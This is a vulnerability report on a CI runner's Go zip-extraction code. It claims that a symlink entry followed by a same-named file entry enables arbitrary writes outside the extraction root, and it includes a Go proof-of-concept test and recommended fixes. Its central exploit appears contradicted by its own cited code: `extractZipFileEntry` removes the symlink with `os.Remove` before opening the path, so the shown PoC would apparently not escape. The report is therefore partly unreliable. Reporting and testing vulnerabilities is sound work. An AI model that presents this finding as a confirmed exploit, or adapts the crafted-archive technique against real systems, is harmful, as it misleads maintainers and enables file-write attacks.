### Title
Zip artifact extraction lacks path/symlink sanitization, enabling symlink-pivot write-through outside extraction root - ([File: helpers/archives/zip_extract.go])

### Summary
`extractZipSymlinkEntry` creates a symlink at `file.Name` pointing to attacker-controlled `data` (the zip entry content) with zero validation of either the symlink path or its target, and `extractZipFileEntry` later writes through whatever path is given via `os.OpenFile`/`io.Copy` without checking whether the resolved path is a symlink leaving the extraction root. Because `ExtractZipArchive` processes `archive.File` sequentially in the order the entries appear in the zip, a crafted artifact with a symlink entry followed by a same-named regular-file entry can pivot a write outside the intended extraction directory.

### Finding Description
`extractZipSymlinkEntry` reads the entry's file content as the symlink target and calls `os.Symlink(string(data), file.Name)` with no check that `data` isn't an absolute path or doesn't traverse via `..`, and no check that `file.Name` itself doesn't traverse outside the extraction root. [1](#0-0) 
`extractZipFileEntry`, used for any later "regular file" entry sharing that same relative path, calls `os.OpenFile(file.Name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, ...)` — which follows symlinks — and then `io.Copy`s attacker-supplied content into it. [2](#0-1) 
`ExtractZipArchive` drives both in a single ordered pass over `archive.File`, so a symlink entry created earlier in the same zip is fully in place before a later same-path regular entry is processed. [3](#0-2) 
The only pre-extraction validation present is `errorIfGitDirectory`, which only rejects paths whose first path component is `.git`; it performs no `..`-traversal or absolute-path checks and no symlink-target validation. [4](#0-3) 

### Impact Explanation
If an attacker can get such a crafted zip processed by `ExtractZipArchive`/`ExtractZipFile` (e.g., as a job artifact or cache archive downloaded and extracted by the Runner), they can create a symlink whose name path-traverses out of the extraction root (or whose target is an absolute/traversal path) and then use a second entry in the same archive to write arbitrary attacker-controlled content through that symlink to a location outside the intended build/artifact directory — an arbitrary file write outside the job root, matching the scoped invariant violation ("File operations must stay within intended build/cache/artifact roots").

### Likelihood Explanation
Both preconditions in the question (attacker controls the symlink name/target and a subsequent regular-file entry in the same zip) are fully satisfiable by any pipeline author able to produce a custom artifact/cache zip (e.g. via a job script building a zip with Go's `archive/zip` or a native `zip -y` for symlinks, then having the Runner or another job stage extract it). The vulnerable code has no existing guard against this pattern — the git-directory check does not address path traversal or symlink targets at all — so exploitation is not blocked by any current control I could find in this file or `path_check_helper.go`. I could not verify from the indexed code whether callers of `ExtractZipFile`/`ExtractZipArchive` (e.g., artifact/cache download commands) impose any additional filesystem confinement (chroot, temp-dir jail, or path canonicalization) before invoking this extraction logic; that would need to be checked in the actual commands/helpers download code to know if there's a compensating control at a higher layer, but nothing of that nature was found in `helpers/archives`.

### Recommendation
Add path/target validation before performing either symlink creation or file writes:
- Reject entries whose `file.Name`, after `filepath.Clean`, is absolute or contains `..` components that escape the extraction root (resolve against the root and verify `strings.HasPrefix` of the cleaned absolute result).
- For symlink entries, reject targets (`data`) that are absolute paths or that, when joined with the symlink's directory and cleaned, resolve outside the extraction root.
- Before `extractZipFileEntry` opens `file.Name` for writing, `os.Lstat` the path; if it resolves (via readlink chain) to a location outside the extraction root, refuse to write, rather than trusting `os.OpenFile` to follow a possibly-malicious symlink.

### Proof of Concept
Go unit test in `helpers/archives/zip_extract_test.go` style:
```go
func TestExtractZipSymlinkPivotWriteOutsideRoot(t *testing.T) {
    testInWorkDir(t, func(t *testing.T, fileName string) {
        outsideDir := t.TempDir() // sibling directory, outside extraction root
        outsideTarget := filepath.Join(outsideDir, "pwned.txt")

        f, err := os.Create(fileName)
        require.NoError(t, err)
        archive := zip.NewWriter(f)

        // 1. symlink entry: "link" -> outsideTarget (path traversal / absolute target)
        hdr := &zip.FileHeader{Name: "link"}
        hdr.SetMode(os.ModeSymlink | 0o777)
        w, _ := archive.CreateHeader(hdr)
        io.WriteString(w, outsideTarget)

        // 2. regular file entry sharing the same name -> writes through the symlink
        w2, _ := archive.Create("link")
        io.WriteString(w2, "attacker controlled content")

        archive.Close()
        f.Close()

        err = ExtractZipFile(fileName)
        require.NoError(t, err)

        // Assert the outside file was created/written — proves escape
        _, statErr := os.Stat(outsideTarget)
        assert.False(t, os.IsNotExist(statErr), "expected write to have escaped extraction root")
        content, _ := os.ReadFile(outsideTarget)
        assert.Equal(t, "attacker controlled content", string(content))
    })
}
```
Expected (buggy) result: `outsideTarget` exists with attacker content, proving write-through outside the extraction root. After the recommended fix, `ExtractZipFile` should return an error (or skip the entry) and `outsideTarget` must not exist.

### Citations

**File:** helpers/archives/zip_extract.go (L22-39)
```go
func extractZipSymlinkEntry(file *zip.File) (err error) {
	var data []byte
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	data, err = io.ReadAll(in)
	if err != nil {
		return err
	}

	// Remove symlink before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	err = os.Symlink(string(data), file.Name)
	return
}
```

**File:** helpers/archives/zip_extract.go (L41-59)
```go
func extractZipFileEntry(file *zip.File) (err error) {
	var out *os.File
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	// Remove file before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	out, err = os.OpenFile(file.Name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode().Perm())
	if err != nil {
		return err
	}
	defer func() { _ = out.Close() }()
	_, err = io.Copy(out, in)

	return
}
```

**File:** helpers/archives/zip_extract.go (L85-96)
```go
func ExtractZipArchive(archive *zip.Reader) error {
	tracker := newPathErrorTracker()

	for _, file := range archive.File {
		if err := errorIfGitDirectory(file.Name); tracker.actionable(err) {
			printGitArchiveWarning("extract")
		}

		if err := extractZipFile(file); tracker.actionable(err) {
			logrus.Warningf("%s: %s (suppressing repeats)", file.Name, err)
		}
	}
```
